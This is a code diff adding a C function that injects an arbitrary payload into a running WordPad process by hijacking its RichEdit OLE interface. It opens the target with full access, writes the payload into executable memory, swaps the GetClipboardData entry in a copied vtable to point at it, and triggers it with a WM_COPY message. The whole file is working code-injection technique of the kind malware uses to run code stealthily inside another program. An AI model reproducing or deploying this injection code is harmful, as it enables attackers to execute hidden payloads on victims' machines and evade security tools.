@@ -1,0 +1,86 @@
+typedef struct _IRichEditOle_t {
+    ULONG_PTR QueryInterface;
+    ULONG_PTR AddRef;
+    ULONG_PTR Release;
+    ULONG_PTR GetClientSite;
+    ULONG_PTR GetObjectCount;
+    ULONG_PTR GetLinkCount;
+    ULONG_PTR GetObject;
+    ULONG_PTR InsertObject;
+    ULONG_PTR ConvertObject;
+    ULONG_PTR ActivateAs;
+    ULONG_PTR SetHostNames;
+    ULONG_PTR SetLinkAvailable;
+    ULONG_PTR SetDvaspect;
+    ULONG_PTR HandsOffStorage;
+    ULONG_PTR SaveCompleted;
+    ULONG_PTR InPlaceDeactivate;
+    ULONG_PTR ContextSensitiveHelp;
+    ULONG_PTR GetClipboardData;
+    ULONG_PTR ImportDataObject;
+} _IRichEditOle;
+
+VOID oleum(LPVOID payload, DWORD payloadSize) {
+    HANDLE                hp;
+    DWORD                 id;
+    HWND                  rew;
+    LPVOID                cs, ds, ptr, mem, tbl;
+    SIZE_T                rd, wr;
+    _IRichEditOle         reo;
+    
+    // 1. Get the window handle
+    rew = FindWindow(L"WordPadClass", NULL);
+    rew = FindWindowEx(rew, NULL, L"RICHEDIT50W", NULL);
+    
+    // 2. Obtain the process id and try to open process
+    GetWindowThreadProcessId(rew, &id);
+    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+
+    // 3. Allocate RWX memory and copy the payload there
+    cs = VirtualAllocEx(hp, NULL, payloadSize, 
+      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+      
+    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+    
+    // 4. Allocate RW memory for the current address
+    ptr = VirtualAllocEx(hp, NULL, sizeof(ULONG_PTR),
+      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+      
+    // 5. Query the interface
+    SendMessage(rew, EM_GETOLEINTERFACE, 0, (LPARAM)ptr);
+    
+    // 6. Read the memory address
+    ReadProcessMemory(hp, ptr, &mem, sizeof(ULONG_PTR), &wr);
+
+    // 7. Read IRichEditOle.lpVtbl
+    ReadProcessMemory(hp, mem, &tbl, sizeof(ULONG_PTR), &wr);
+
+    // 8. Read virtual function table
+    ReadProcessMemory(hp, tbl, &reo, sizeof(_IRichEditOle), &wr);
+
+    // 9. Allocate memory for copy of virtual table
+    ds = VirtualAllocEx(hp, NULL, sizeof(_IRichEditOle),
+      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+      
+    // 10. Set the GetClipboardData method to address of payload
+    reo.GetClipboardData = (ULONG_PTR)cs;
+    
+    // 11. Write new virtual function table to remote memory
+    WriteProcessMemory(hp, ds, &reo, sizeof(_IRichEditOle), &wr);
+    
+    // 12. update IRichEditOle.lpVtbl
+    WriteProcessMemory(hp, mem, &ds, sizeof(ULONG_PTR), &wr); 
+    
+    // 13. Trigger payload by invoking the GetClipboardData method
+    PostMessage(rew, WM_COPY, 0, 0);
+    
+    // 14. Restore original value of IRichEditOle.lpVtbl
+    WriteProcessMemory(hp, mem, &tbl, sizeof(ULONG_PTR), &wr);
+    
+    // 15. Free memory and close process handle
+    VirtualFreeEx(hp, ptr,0, MEM_DECOMMIT | MEM_RELEASE);
+    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
+    
+    CloseHandle(hp);   
+}
